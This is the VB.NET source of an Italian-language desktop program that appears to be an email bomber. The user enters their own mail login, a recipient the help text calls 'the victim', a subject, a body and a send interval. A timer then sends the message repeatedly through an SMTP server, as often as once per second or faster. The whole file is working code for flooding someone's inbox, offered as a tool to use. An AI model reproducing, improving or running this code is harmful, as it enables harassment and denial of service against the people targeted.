Imports System.Net.Mail
Imports System.IO
Imports System.Text.RegularExpressions
Public Class Form1
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim MyMailMessage As New MailMessage
        Try
            MyMailMessage.From() = New MailAddress(TextBox1.Text)
            MyMailMessage.To.Add(TextBox3.Text)
            MyMailMessage.Subject = TextBox5.Text
            MyMailMessage.Body = (TextBox4.Text)
            Dim SMTP As New SmtpClient(Form3.TextBox2.Text)
            SMTP.Port = Form3.TextBox3.Text
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential(TextBox1.Text, TextBox2.Text)
            SMTP.Send(MyMailMessage)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        MsgBox("In questo mio mini-programma, vengono richiesti alcuni dati:" & vbCrLf & "1.La tua e-mail che sarà poi visualizzata dal destinatario;" & vbCrLf & "2.La password che verrà poi inviata al server smtp.live.com per eseguire l'autenticazione come se fossi sul normale messenger;" & vbCrLf & "3.L'e-mail della vittima, a cui verranno recapitate le e-mail;" & vbCrLf & "4.L'oggetto della mail;" & vbCrLf & "5.Il testo della mail;" & vbCrLf & "6.La velocità a cui le vogliamo recapitare;", MsgBoxStyle.Information)
    End Sub
    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Form2.Show()
    End Sub
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim MyMailMessage As New MailMessage
        Try
            MyMailMessage.From() = New MailAddress(TextBox1.Text)
            MyMailMessage.To.Add(TextBox3.Text)
            MyMailMessage.Subject = TextBox5.Text
            MyMailMessage.Body = (TextBox4.Text)
            Dim SMTP As New SmtpClient(Form3.TextBox2.Text)
            SMTP.Port = Form3.TextBox3.Text
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential(TextBox1.Text, TextBox2.Text)
            SMTP.Send(MyMailMessage)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Timer1.Stop()
        Button1.Enabled = True
        Button7.Enabled = True
    End Sub
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Timer1.Interval = TextBox6.Text
        If TextBox1.BackColor = Color.Lime And TextBox2.BackColor = Color.White And TextBox3.BackColor = Color.White And TextBox4.BackColor = Color.White And TextBox6.BackColor = Color.White Then
            Button1.Enabled = True
            Button7.Enabled = True
        Else
            MsgBox("Devi compilare tutti i campi rossi!")
        End If
    End Sub
    Private Sub CheckBox1_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            TextBox2.UseSystemPasswordChar = False
        Else
            TextBox2.UseSystemPasswordChar = True
        End If
    End Sub
    Private Sub TextBox1_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox1.TextChanged
        If TextBox1.Text = "" Then
            TextBox1.BackColor = Color.Red
        Else
            TextBox1.BackColor = Color.White
        End If
        Dim FoundMatch As Boolean
        Try
            FoundMatch = Regex.IsMatch(TextBox1.Text, "\A(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)\Z", RegexOptions.IgnoreCase)
        Catch ex As ArgumentException 'Syntax error in the regular expression
        End Try
        If Not FoundMatch Then
            TextBox1.BackColor = Color.Red
            TextBox1.Focus()
        Else
            TextBox1.BackColor = Color.Lime
        End If
    End Sub
    Private Sub TextBox2_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox2.TextChanged
        If TextBox2.Text = "" Then
            TextBox2.BackColor = Color.Red
        Else
            TextBox2.BackColor = Color.White
        End If
    End Sub
    Private Sub TextBox3_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox3.TextChanged
        If TextBox3.Text = "" Then
            TextBox3.BackColor = Color.Red
        Else
            TextBox3.BackColor = Color.White
        End If
    End Sub
    Private Sub TextBox5_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox5.TextChanged
        If TextBox5.Text = "" Then
            TextBox5.BackColor = Color.Orange
        Else
            TextBox5.BackColor = Color.White
        End If
    End Sub
    Private Sub TextBox4_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox4.TextChanged
        If TextBox4.Text = "" Then
            TextBox4.BackColor = Color.Red
        Else
            TextBox4.BackColor = Color.White
        End If
    End Sub
    Private Sub TextBox6_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox6.TextChanged
        If TextBox6.Text = "" Then
            TextBox6.BackColor = Color.Red
        Else
            TextBox6.BackColor = Color.White
        End If
    End Sub
    Private Sub Button6_Click(sender As System.Object, e As System.EventArgs) Handles Button6.Click
        MsgBox("Valore in millisecondi: 1000 = 1 messaggio al secondo.")
    End Sub
    Private Sub Button7_Click(sender As System.Object, e As System.EventArgs) Handles Button7.Click
        Timer1.Start()
    End Sub
    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        Form4.Show()
    End Sub
End Class